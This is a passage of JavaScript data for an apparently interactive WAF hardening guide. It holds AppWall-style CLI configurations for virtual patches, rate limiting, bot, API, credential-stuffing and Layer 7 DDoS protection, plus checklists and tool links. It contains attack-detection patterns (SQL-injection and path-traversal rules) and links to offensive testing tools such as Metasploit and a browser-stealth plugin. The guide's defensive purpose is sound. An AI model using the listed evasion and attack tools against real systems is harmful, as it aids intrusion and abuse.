                            <div><span class="code-command">virtual-patches</span></div>
                            <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                            <div class="code-comment"># Create a virtual patch for CVE-2023-XXXXX (example)</div>
                            <div><span class="code-command">patch</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"CVE-2023-XXXXX-LegacyCMS-SQLi"</span></div>
                            <div><span class="code-command">patch</span> <span class="code-value">"CVE-2023-XXXXX-LegacyCMS-SQLi"</span></div>
                            <div><span class="code-param">description</span> <span class="code-value">"Virtual patch for SQL injection in Legacy CMS search parameter"</span></div>
                            <div><span class="code-param">cve</span> <span class="code-value">"CVE-2023-XXXXX"</span></div>
                            <div><span class="code-param">url</span> <span class="code-value">"/legacy/search.php"</span></div>
                            <div><span class="code-param">parameter</span> <span class="code-value">"q"</span></div>
                            <div><span class="code-param">pattern</span> <span class="code-value">"['\"\\;]+"</span></div>
                            <div><span class="code-param">action</span> <span class="code-value">block</span></div>
                            <div><span class="code-param">expiration</span> <span class="code-value">"2026-01-01"</span></div>
                            <div><span class="code-param">status</span> <span class="code-value">active</span></div>
                            <div class="code-comment"># Create a virtual patch for path traversal</div>
                            <div><span class="code-command">patch</span> <span class="code-value">add</span> <span class="code-param">name</span> <span class="code-value">"File-Download-Path-Traversal"</span></div>
                            <div><span class="code-command">patch</span> <span class="code-value">"File-Download-Path-Traversal"</span></div>
                            <div><span class="code-param">description</span> <span class="code-value">"Virtual patch for path traversal in file download function"</span></div>
                            <div><span class="code-param">url</span> <span class="code-value">"/download.php"</span></div>
                            <div><span class="code-param">parameter</span> <span class="code-value">"file"</span></div>
                            <div><span class="code-param">allowed-pattern</span> <span class="code-value">"^[a-zA-Z0-9_-]+\\.(pdf|doc|docx|xls|xlsx|txt)$"</span></div>
                            <div><span class="code-param">action</span> <span class="code-value">block</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                        
                        <h5 class="font-semibold mb-2 mt-4 text-gray-800">Virtual Patching Approach</h5>
                        <p class="mb-4 text-gray-700">Effective virtual patching involves a systematic approach:</p>
                        <ol class="list-decimal pl-6 mb-4 text-gray-700">
                            <li class="mb-2">Identify the vulnerability details (location, exploit method)</li>
                            <li class="mb-2">Create a targeted rule focusing on the specific vulnerability</li>
                            <li class="mb-2">Test the patch against both exploit attempts and legitimate traffic</li>
                            <li class="mb-2">Document the purpose, limitations, and expected lifespan of the patch</li>
                            <li>Monitor for bypass attempts and refine the patch as needed</li>
                        </ol>
                    `
                },
                {
                    title: 'Rate Limiting and Anti-Automation Rules',
                    content: `
                        <p class="mb-4 text-gray-700">Configure rate limiting to prevent abuse, brute force attempts, and excessive resource consumption.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Configure rate limiting for specific endpoints</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">appwall</span></div>
                            <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                            <div><span class="code-command">rate-limiting</span></div>
                            <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                            <div class="code-comment"># Set global defaults</div>
                            <div><span class="code-param">default-requests-per-second</span> <span class="code-value">100</span></div>
                            <div><span class="code-param">default-burst-size</span> <span class="code-value">200</span></div>
                            <div><span class="code-param">default-action</span> <span class="code-value">throttle</span></div>
                            <div class="code-comment"># Configure endpoint-specific limits</div>
                            <div><span class="code-command">endpoint</span> <span class="code-value">add</span> <span class="code-param">url</span> <span class="code-value">"/api/search"</span></div>
                            <div><span class="code-command">endpoint</span> <span class="code-value">"/api/search"</span></div>
                            <div><span class="code-param">requests-per-second</span> <span class="code-value">20</span></div>
                            <div><span class="code-param">burst-size</span> <span class="code-value">40</span></div>
                            <div><span class="code-param">action</span> <span class="code-value">throttle</span></div>
                            <div><span class="code-command">exit</span></div>
                            <div class="code-comment"># Configure sensitive endpoints with stricter limits</div>
                            <div><span class="code-command">endpoint</span> <span class="code-value">add</span> <span class="code-param">url</span> <span class="code-value">"/login"</span></div>
                            <div><span class="code-command">endpoint</span> <span class="code-value">"/login"</span></div>
                            <div><span class="code-param">requests-per-second</span> <span class="code-value">5</span></div>
                            <div><span class="code-param">burst-size</span> <span class="code-value">10</span></div>
                            <div><span class="code-param">action</span> <span class="code-value">block</span></div>
                            <div><span class="code-param">block-period</span> <span class="code-value">300</span></div>
                            <div><span class="code-command">exit</span></div>
                            <div class="code-comment"># Configure heavy resource endpoints</div>
                            <div><span class="code-command">endpoint</span> <span class="code-value">add</span> <span class="code-param">url</span> <span class="code-value">"/api/report"</span></div>
                            <div><span class="code-command">endpoint</span> <span class="code-value">"/api/report"</span></div>
                            <div><span class="code-param">requests-per-second</span> <span class="code-value">2</span></div>
                            <div><span class="code-param">burst-size</span> <span class="code-value">5</span></div>
                            <div><span class="code-param">action</span> <span class="code-value">throttle</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                        
                        <h5 class="font-semibold mb-2 mt-4 text-gray-800">Rate Limiting Best Practices</h5>
                        <p class="mb-4 text-gray-700">Implement rate limiting based on application requirements:</p>
                        <ul class="list-disc pl-6 mb-4 text-gray-700">
                            <li class="mb-2"><strong>Endpoint-Specific Limits:</strong> Different limits for different endpoint sensitivity</li>
                            <li class="mb-2"><strong>User-Based vs. IP-Based:</strong> Consider authenticated user limits vs. IP address limits</li>
                            <li class="mb-2"><strong>Graduated Response:</strong> Escalate from throttling to blocking for persistent abuse</li>
                            <li class="mb-2"><strong>Response Feedback:</strong> Clear error messages with retry-after headers</li>
                            <li><strong>Whitelisting:</strong> Configure exemptions for trusted systems (monitoring, essential services)</li>
                        </ul>
                    `
                }
            ],
            tools: [
                {
                    title: 'Rule Testing Framework',
                    icon: 'fa-flask',
                    description: 'Framework for testing custom rules against legitimate and malicious traffic patterns.',
                    link: 'https://www.radware.com/products/appwall/',
                    linkText: 'AppWall Testing'
                },
                {
                    title: 'CSRF Tester',
                    icon: 'fa-link-slash',
                    description: 'Tool for validating CSRF protection by simulating cross-site request attempts.',
                    link: 'https://owasp.org/www-project-zap/',
                    linkText: 'OWASP ZAP'
                },
                {
                    title: 'Parameter Fuzzer',
                    icon: 'fa-random',
                    description: 'Generate various inputs to test parameter validation rules and identify weaknesses.',
                    link: 'https://github.com/ffuf/ffuf',
                    linkText: 'FFUF'
                },
                {
                    title: 'Rule Performance Analyzer',
                    icon: 'fa-tachometer-alt',
                    description: 'Analyze the performance impact of custom security rules on application response time.',
                    link: 'https://www.radware.com/products/appwall/',
                    linkText: 'Performance Tools'
                }
            ]
        },
        {
            id: 'threat-protection',
            title: '7. Advanced Threat Protection',
            subtitle: 'Bot detection, API security, and anti-automation controls',
            icon: 'fa-robot',
            priority: 'critical',
            progress: 0,
            checklist: [
                {
                    title: '7.1 Bot Protection',
                    icon: 'fa-robot',
                    items: [
                        { id: '7.1.1', text: 'Enable and configure bot detection mechanisms', priority: 'critical' },
                        { id: '7.1.2', text: 'Set up CAPTCHA or challenge-response systems', priority: 'high' },
                        { id: '7.1.3', text: 'Configure browser validation techniques', priority: 'high' },
                        { id: '7.1.4', text: 'Implement device fingerprinting for bot detection', priority: 'medium' },
                        { id: '7.1.5', text: 'Set up behavioral analysis for bot identification', priority: 'high' },
                        { id: '7.1.6', text: 'Configure rate limiting and throttling policies', priority: 'critical' },
                        { id: '7.1.7', text: 'Define bot signatures for known automation tools', priority: 'high' },
                        { id: '7.1.8', text: 'Set up progressive bot challenges based on risk level', priority: 'medium' }
                    ]
                },
                {
                    title: '7.2 API Security',
                    icon: 'fa-plug',
                    items: [
                        { id: '7.2.1', text: 'Set up API-specific security policies', priority: 'critical' },
                        { id: '7.2.2', text: 'Configure API authentication validation', priority: 'critical' },
                        { id: '7.2.3', text: 'Implement API rate limiting controls', priority: 'high' },
                        { id: '7.2.4', text: 'Set up schema validation for API requests/responses', priority: 'high' },
                        { id: '7.2.5', text: 'Configure API-specific attack signatures', priority: 'high' },
                        { id: '7.2.6', text: 'Enable API access control validation', priority: 'critical' },
                        { id: '7.2.7', text: 'Implement API versioning protection', priority: 'medium' },
                        { id: '7.2.8', text: 'Configure API endpoint restrictions', priority: 'high' }
                    ]
                },
                {
                    title: '7.3 Anti-Automation',
                    icon: 'fa-shield-alt',
                    items: [
                        { id: '7.3.1', text: 'Configure anti-scraping protections', priority: 'high' },
                        { id: '7.3.2', text: 'Set up credential stuffing prevention', priority: 'critical' },
                        { id: '7.3.3', text: 'Implement account takeover protection', priority: 'critical' },
                        { id: '7.3.4', text: 'Configure session anomaly detection', priority: 'high' },
                        { id: '7.3.5', text: 'Set up IP reputation filtering', priority: 'high' },
                        { id: '7.3.6', text: 'Enable geographic-based access restrictions', priority: 'medium' },
                        { id: '7.3.7', text: 'Implement human verification for suspicious traffic', priority: 'high' },
                        { id: '7.3.8', text: 'Configure behavior-based anomaly detection', priority: 'high' }
                    ]
                },
                {
                    title: '7.4 Advanced Attack Mitigation',
                    icon: 'fa-user-ninja',
                    items: [
                        { id: '7.4.1', text: 'Configure protection against Layer 7 DDoS attacks', priority: 'critical' },
                        { id: '7.4.2', text: 'Set up behavioral DoS protection', priority: 'high' },
                        { id: '7.4.3', text: 'Implement slowloris and slow POST attack mitigation', priority: 'high' },
                        { id: '7.4.4', text: 'Configure protection against HTTP/2 abuse', priority: 'medium' },
                        { id: '7.4.5', text: 'Set up zero-day attack protection mechanisms', priority: 'high' },
                        { id: '7.4.6', text: 'Implement protection against advanced evasion techniques', priority: 'high' },
                        { id: '7.4.7', text: 'Configure coordinated attack detection', priority: 'medium' }
                    ]
                }
            ],
            techniques: [
                {
                    title: 'Bot Protection Configuration',
                    content: `
                        <p class="mb-4 text-gray-700">Implement comprehensive bot detection and prevention to protect against automated attacks.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Configure bot protection</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">appwall</span></div>
                            <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                            <div><span class="code-command">bot-protection</span></div>
                            <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">detection-level</span> <span class="code-value">high</span></div>
                            <div class="code-comment"># JavaScript-based browser validation</div>
                            <div><span class="code-command">browser-verification</span></div>
                            <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">action</span> <span class="code-value">challenge</span></div>
                            <div class="code-comment"># CAPTCHA protection</div>
                            <div><span class="code-command">captcha-protection</span></div>
                            <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">trigger-threshold</span> <span class="code-value">suspicious</span></div>
                            <div class="code-comment"># Rate limiting</div>
                            <div><span class="code-command">rate-limiting</span></div>
                            <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">requests-per-second</span> <span class="code-value">10</span></div>
                            <div><span class="code-param">burst</span> <span class="code-value">20</span></div>
                            <div><span class="code-param">action</span> <span class="code-value">temporary-block</span></div>
                            <div class="code-comment"># Fingerprinting</div>
                            <div><span class="code-command">fingerprinting</span></div>
                            <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">methods</span> <span class="code-value">browser,device,network</span></div>
                            <div class="code-comment"># Bot signatures</div>
                            <div><span class="code-command">signature</span> <span class="code-value">enable-category</span> <span class="code-param">name</span> <span class="code-value">"scrapers"</span></div>
                            <div><span class="code-command">signature</span> <span class="code-value">enable-category</span> <span class="code-param">name</span> <span class="code-value">"automation-tools"</span></div>
                            <div><span class="code-command">signature</span> <span class="code-value">enable-category</span> <span class="code-param">name</span> <span class="code-value">"vulnerability-scanners"</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                        
                        <h5 class="font-semibold mb-2 mt-4 text-gray-800">Bot Detection Techniques</h5>
                        <p class="mb-4 text-gray-700">Modern bot protection employs multiple detection techniques to identify automated traffic:</p>
                        <table class="w-full text-left border-collapse mb-6">
                            <thead>
                                <tr>
                                    <th class="p-3 border bg-gray-100">Technique</th>
                                    <th class="p-3 border bg-gray-100">Description</th>
                                    <th class="p-3 border bg-gray-100">Effectiveness</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td class="p-3 border">JavaScript Challenges</td>
                                    <td class="p-3 border">Validates if the client can execute JavaScript code</td>
                                    <td class="p-3 border">Medium - Can be bypassed by advanced bots</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Browser Fingerprinting</td>
                                    <td class="p-3 border">Analyzes browser characteristics for inconsistencies</td>
                                    <td class="p-3 border">High - Difficult to perfectly simulate browsers</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">CAPTCHA</td>
                                    <td class="p-3 border">Visual or audio challenges to verify human users</td>
                                    <td class="p-3 border">High - But impacts user experience</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Behavioral Analysis</td>
                                    <td class="p-3 border">Monitors mouse movements, typing patterns, and navigation</td>
                                    <td class="p-3 border">Very High - Advanced bots struggle to mimic</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Rate Limiting</td>
                                    <td class="p-3 border">Restricts requests based on frequency and patterns</td>
                                    <td class="p-3 border">Medium - Slows but doesn't stop sophisticated bots</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Device Fingerprinting</td>
                                    <td class="p-3 border">Identifies unique device characteristics</td>
                                    <td class="p-3 border">High - Difficult to spoof completely</td>
                                </tr>
                            </tbody>
                        </table>
                    `
                },
                {
                    title: 'API Security Configuration',
                    content: `
                        <p class="mb-4 text-gray-700">Implement dedicated API security controls to protect web services and API endpoints.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Configure API security</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">appwall</span></div>
                            <div><span class="code-command">policy</span> <span class="code-value">"API-Services"</span></div>
                            <div><span class="code-command">api-security</span></div>
                            <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                            <div class="code-comment"># API schema validation</div>
                            <div><span class="code-command">schema-validation</span></div>
                            <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">schema-type</span> <span class="code-value">openapi-v3</span></div>
                            <div><span class="code-param">schema-file</span> <span class="code-value">"/tmp/api-schema.json"</span></div>
                            <div><span class="code-param">validation-level</span> <span class="code-value">strict</span></div>
                            <div class="code-comment"># API authentication</div>
                            <div><span class="code-command">authentication</span></div>
                            <div><span class="code-param">token-location</span> <span class="code-value">header</span></div>
                            <div><span class="code-param">token-name</span> <span class="code-value">"Authorization"</span></div>
                            <div><span class="code-param">token-type</span> <span class="code-value">"Bearer"</span></div>
                            <div><span class="code-param">jwks-url</span> <span class="code-value">"https://auth.example.com/.well-known/jwks.json"</span></div>
                            <div class="code-comment"># API rate limiting</div>
                            <div><span class="code-command">rate-limiting</span></div>
                            <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">per-endpoint</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">per-client</span> <span class="code-value">enable</span></div>
                            <div><span class="code-command">endpoint</span> <span class="code-value">add</span> <span class="code-param">url</span> <span class="code-value">"/api/v1/users"</span> <span class="code-param">method</span> <span class="code-value">"POST"</span> <span class="code-param">limit</span> <span class="code-value">5</span> <span class="code-param">period</span> <span class="code-value">60</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                        
                        <h5 class="font-semibold mb-2 mt-4 text-gray-800">API Security Threats & Protections</h5>
                        <p class="mb-4 text-gray-700">Common API security threats and appropriate protection strategies:</p>
                        <table class="w-full text-left border-collapse mb-6">
                            <thead>
                                <tr>
                                    <th class="p-3 border bg-gray-100">API Threat</th>
                                    <th class="p-3 border bg-gray-100">Protection Mechanism</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td class="p-3 border">Broken Authentication</td>
                                    <td class="p-3 border">JWT validation, OAuth token verification, API key protection</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Excessive Data Exposure</td>
                                    <td class="p-3 border">Response filtering, data leakage prevention, schema validation</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Resource Exhaustion</td>
                                    <td class="p-3 border">Request rate limiting, payload size controls, timeout management</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Broken Access Control</td>
                                    <td class="p-3 border">Endpoint access policies, scope validation, role verification</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Mass Assignment</td>
                                    <td class="p-3 border">Schema validation, allowed property lists</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Parameter Tampering</td>
                                    <td class="p-3 border">Parameter validation, type enforcement, range checking</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Schema Violation</td>
                                    <td class="p-3 border">OpenAPI/Swagger validation, content-type enforcement</td>
                                </tr>
                            </tbody>
                        </table>
                    `
                },
                {
                    title: 'Credential Stuffing Protection',
                    content: `
                        <p class="mb-4 text-gray-700">Configure protection against credential stuffing attacks where attackers use stolen username/password combinations.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Configure credential stuffing protection</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">appwall</span></div>
                            <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                            <div><span class="code-command">credential-stuffing</span></div>
                            <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">login-url</span> <span class="code-value">"/login"</span> <span class="code-param">method</span> <span class="code-value">"POST"</span></div>
                            <div><span class="code-param">username-parameter</span> <span class="code-value">"username"</span></div>
                            <div><span class="code-param">password-parameter</span> <span class="code-value">"password"</span></div>
                            <div class="code-comment"># Progressive defense measures</div>
                            <div><span class="code-param">detection-threshold</span> <span class="code-value">medium</span></div>
                            <div><span class="code-param">login-success-url</span> <span class="code-value">"/dashboard"</span></div>
                            <div><span class="code-param">login-failure-url</span> <span class="code-value">"/login?error=1"</span></div>
                            <div class="code-comment"># Defense mechanisms</div>
                            <div><span class="code-command">defense</span></div>
                            <div><span class="code-param">rate-limiting</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">captcha</span> <span class="code-value">enable</span> <span class="code-param">threshold</span> <span class="code-value">3</span></div>
                            <div><span class="code-param">device-fingerprinting</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">ip-reputation</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">username-tracking</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">temporary-lockout</span> <span class="code-value">enable</span> <span class="code-param">attempts</span> <span class="code-value">5</span> <span class="code-param">duration</span> <span class="code-value">300</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                        
                        <h5 class="font-semibold mb-2 mt-4 text-gray-800">Multi-layered Defense</h5>
                        <p class="mb-4 text-gray-700">Effective credential stuffing protection requires multiple coordinated defensive layers:</p>
                        <ol class="list-decimal pl-6 mb-4 text-gray-700">
                            <li class="mb-2"><strong>Login Attempt Rate Limiting:</strong> Restrict login attempts per IP address or username</li>
                            <li class="mb-2"><strong>Progressive Challenges:</strong> Introduce increasing friction for suspicious login attempts</li>
                            <li class="mb-2"><strong>Device Fingerprinting:</strong> Track and analyze devices used for login attempts</li>
                            <li class="mb-2"><strong>Behavioral Analysis:</strong> Identify abnormal login patterns across accounts</li>
                            <li class="mb-2"><strong>IP Reputation:</strong> Block or challenge logins from known malicious IPs</li>
                            <li class="mb-2"><strong>Username Enumeration Prevention:</strong> Provide identical responses for valid/invalid usernames</li>
                            <li><strong>Anomaly Detection:</strong> Identify unusual login activity patterns across the platform</li>
                        </ol>
                    `
                },
                {
                    title: 'Layer 7 DDoS Protection',
                    content: `
                        <p class="mb-4 text-gray-700">Configure protection against application layer (Layer 7) Distributed Denial of Service attacks.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Configure Layer 7 DDoS protection</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">appwall</span></div>
                            <div><span class="code-command">policy</span> <span class="code-value">"Web-Portal"</span></div>
                            <div><span class="code-command">ddos-protection</span></div>
                            <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                            <div class="code-comment"># Baseline traffic profile</div>
                            <div><span class="code-param">auto-baselining</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">learning-period</span> <span class="code-value">7</span></div>
                            <div><span class="code-param">sensitivity</span> <span class="code-value">medium</span></div>
                            <div class="code-comment"># HTTP flood protection</div>
                            <div><span class="code-command">http-flood</span></div>
                            <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">request-threshold</span> <span class="code-value">5000</span></div>
                            <div><span class="code-param">action</span> <span class="code-value">challenge</span></div>
                            <div class="code-comment"># Slow HTTP attack protection</div>
                            <div><span class="code-command">slow-http</span></div>
                            <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                            <div><span class="code-param">timeout</span> <span class="code-value">10</span></div>
                            <div><span class="code-param">min-rate</span> <span class="code-value">500</span></div>
                            <div class="code-comment"># Targeted URL protection</div>
                            <div><span class="code-command">protected-url</span> <span class="code-value">add</span> <span class="code-param">url</span> <span class="code-value">"/api/search"</span></div>
                            <div><span class="code-command">protected-url</span> <span class="code-value">"/api/search"</span></div>
                            <div><span class="code-param">request-threshold</span> <span class="code-value">1000</span></div>
                            <div><span class="code-param">burst-threshold</span> <span class="code-value">2000</span></div>
                            <div><span class="code-param">action</span> <span class="code-value">throttle</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                        
                        <h5 class="font-semibold mb-2 mt-4 text-gray-800">Layer 7 DDoS Attack Types & Mitigations</h5>
                        <p class="mb-4 text-gray-700">Common application layer DDoS attacks and their mitigation strategies:</p>
                        <table class="w-full text-left border-collapse mb-6">
                            <thead>
                                <tr>
                                    <th class="p-3 border bg-gray-100">Attack Type</th>
                                    <th class="p-3 border bg-gray-100">Description</th>
                                    <th class="p-3 border bg-gray-100">Mitigation</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td class="p-3 border">HTTP Flood</td>
                                    <td class="p-3 border">High volume of HTTP GET/POST requests</td>
                                    <td class="p-3 border">Rate limiting, challenge-response, behavioral analysis</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Slowloris</td>
                                    <td class="p-3 border">Slow request headers sent at intervals</td>
                                    <td class="p-3 border">Connection timeout, header completion requirements</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Slow POST</td>
                                    <td class="p-3 border">POST request body sent at slow rate</td>
                                    <td class="p-3 border">Minimum transfer rate enforcement, request timeouts</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">RUDY (R-U-Dead-Yet)</td>
                                    <td class="p-3 border">Form submissions with very long content-length</td>
                                    <td class="p-3 border">Maximum body size limits, transfer rate requirements</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Cache Busting</td>
                                    <td class="p-3 border">Random query parameters to bypass caching</td>
                                    <td class="p-3 border">URL normalization, query parameter analysis</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Resource Exhaustion</td>
                                    <td class="p-3 border">Targeting CPU/memory-intensive operations</td>
                                    <td class="p-3 border">Resource allocation limits, complexity monitoring</td>
                                </tr>
                            </tbody>
                        </table>
                    `
                }
            ],
            tools: [
                {
                    title: 'Bot Detection Tester',
                    icon: 'fa-robot',
                    description: 'Test bot detection capabilities against various automated tools and scripts.',
                    link: 'https://github.com/bmarvinb/puppeteer-extra-plugin-stealth',
                    linkText: 'Puppeteer Stealth'
                },
                {
                    title: 'API Security Scanner',
                    icon: 'fa-plug',
                    description: 'Test API endpoints for security vulnerabilities and configuration issues.',
                    link: 'https://github.com/OWASP/APICheck',
                    linkText: 'OWASP APICheck'
                },
                {
                    title: 'Credential Stuffing Simulator',
                    icon: 'fa-user-secret',
                    description: 'Test credential stuffing protections with simulated login attempts.',
                    link: 'https://github.com/rapid7/metasploit-framework',
                    linkText: 'Metasploit'
                },
                {
                    title: 'DDoS Testing Tool',
                    icon: 'fa-server',
                    description: 'Test Layer 7 DDoS protection with controlled load testing.',
                    link: 'https://github.com/loadimpact/k6',
                    linkText: 'k6'
                }
            ]
        },
        {
            id: 'performance',
            title: '8. Performance Optimization',
            subtitle: 'Tuning for minimal latency and maximum protection',
            icon: 'fa-tachometer-alt',
            priority: 'medium',
            progress: 33,
            checklist: [
                {
                    title: '8.1 Hardware Optimization',
                    icon: 'fa-server',
                    items: [
                        { id: '8.1.1', text: 'Configure hardware resource allocation', priority: 'high' },
                        { id: '8.1.2', text: 'Set up CPU affinity for optimal processing', priority: 'medium' },
                        { id: '8.1.3', text: 'Configure memory allocation for traffic analysis', priority: 'high' },
                        { id: '8.1.4', text: 'Optimize network interface settings', priority: 'medium' },
                        { id: '8.1.5', text: 'Configure disk I/O for logging efficiency', priority: 'medium' }
                    ]
                },
                {
                    title: '8.2 Policy Optimization',
                    icon: 'fa-bolt',
                    items: [
                        { id: '8.2.1', text: 'Configure policy-based inspection depth', priority: 'high' },
                        { id: '8.2.2', text: 'Set up URL-specific protection levels', priority: 'medium' },
                        { id: '8.2.3', text: 'Optimize signature matching algorithms', priority: 'high' },
                        { id: '8.2.4', text: 'Configure response inspection thresholds', priority: 'medium' },
                        { id: '8.2.5', text: 'Set up attack category prioritization', priority: 'medium' }
                    ]
                },
                {
                    title: '8.3 Traffic Management',
                    icon: 'fa-random',
                    items: [
                        { id: '8.3.1', text: 'Configure traffic-based dynamic scaling', priority: 'high' },
                        { id: '8.3.2', text: 'Set up connection pooling for backend servers', priority: 'medium' },
                        { id: '8.3.3', text: 'Implement HTTP/2 support for efficiency', priority: 'medium' },
                        { id: '8.3.4', text: 'Configure SSL/TLS session caching', priority: 'medium' },
                        { id: '8.3.5', text: 'Set up compression handling policies', priority: 'low' },
                        { id: '8.3.6', text: 'Optimize traffic analysis sampling rates', priority: 'medium' }
                    ]
                },
                {
                    title: '8.4 Performance Monitoring',
                    icon: 'fa-chart-line',
                    items: [
                        { id: '8.4.1', text: 'Configure performance baseline monitoring', priority: 'high' },
                        { id: '8.4.2', text: 'Set up latency and throughput tracking', priority: 'medium' },
                        { id: '8.4.3', text: 'Implement resource utilization monitoring', priority: 'medium' },
                        { id: '8.4.4', text: 'Configure performance degradation alerts', priority: 'high' },
                        { id: '8.4.5', text: 'Set up application response time monitoring', priority: 'medium' }
                    ]
                }
            ],
            techniques: [
                {
                    title: 'Hardware Resource Optimization',
                    content: `
                        <p class="mb-4 text-gray-700">Configure optimal hardware resource allocation to ensure maximum WAF performance.</p>
                        
                        <div class="code-block">
                            <div class="code-comment"># Configure hardware resources</div>
                            <div><span class="code-command">configure</span> terminal</div>
                            <div><span class="code-command">system</span> resources</div>
                            <div class="code-comment"># CPU resource allocation</div>
                            <div><span class="code-param">cpu-allocation traffic-processing</span> <span class="code-value">70</span></div>
                            <div><span class="code-param">cpu-allocation logging</span> <span class="code-value">15</span></div>
                            <div><span class="code-param">cpu-allocation management</span> <span class="code-value">15</span></div>
                            <div><span class="code-param">cpu-cores</span> <span class="code-value">0-7</span> <span class="code-param">function</span> <span class="code-value">traffic-processing</span></div>
                            <div><span class="code-param">cpu-cores</span> <span class="code-value">8-9</span> <span class="code-param">function</span> <span class="code-value">logging</span></div>
                            <div><span class="code-param">cpu-cores</span> <span class="code-value">10-11</span> <span class="code-param">function</span> <span class="code-value">management</span></div>
                            <div class="code-comment"># Memory allocation</div>
                            <div><span class="code-param">memory-allocation traffic-processing</span> <span class="code-value">70</span></div>
                            <div><span class="code-param">memory-allocation cache</span> <span class="code-value">20</span></div>
                            <div><span class="code-param">memory-allocation system</span> <span class="code-value">10</span></div>
                            <div class="code-comment"># Disk I/O optimization</div>
                            <div><span class="code-param">logging-disk-buffer</span> <span class="code-value">4096</span></div>
                            <div><span class="code-param">disk-flush-interval</span> <span class="code-value">10</span></div>
                            <div><span class="code-command">commit</span></div>
                            <div><span class="code-command">exit</span></div>
                        </div>
                        
                        <h5 class="font-semibold mb-2 mt-4 text-gray-800">Hardware Sizing Guidelines</h5>
                        <p class="mb-4 text-gray-700">General guidelines for AppWall hardware sizing based on traffic volume:</p>
                        <table class="w-full text-left border-collapse mb-6">
                            <thead>
                                <tr>
                                    <th class="p-3 border bg-gray-100">Traffic Volume</th>
                                    <th class="p-3 border bg-gray-100">CPU Cores</th>
                                    <th class="p-3 border bg-gray-100">Memory</th>
                                    <th class="p-3 border bg-gray-100">Storage</th>
                                    <th class="p-3 border bg-gray-100">Network</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td class="p-3 border">Light (<100 Mbps)</td>
                                    <td class="p-3 border">4-8 cores</td>
                                    <td class="p-3 border">16 GB</td>
                                    <td class="p-3 border">250 GB SSD</td>
                                    <td class="p-3 border">1 Gbps</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Medium (100-500 Mbps)</td>
                                    <td class="p-3 border">8-16 cores</td>
                                    <td class="p-3 border">32 GB</td>
                                    <td class="p-3 border">500 GB SSD</td>
                                    <td class="p-3 border">10 Gbps</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Heavy (500 Mbps-1 Gbps)</td>
                                    <td class="p-3 border">16-32 cores</td>
                                    <td class="p-3 border">64 GB</td>
                                    <td class="p-3 border">1 TB SSD</td>
                                    <td class="p-3 border">10 Gbps</td>
                                </tr>
                                <tr>
                                    <td class="p-3 border">Very Heavy (>1 Gbps)</td>
                                    <td class="p-3 border">32+ cores</td>
                                    <td class="p-3 border">128+ GB</td>
                                    <td class="p-3 border">2+ TB SSD</td>
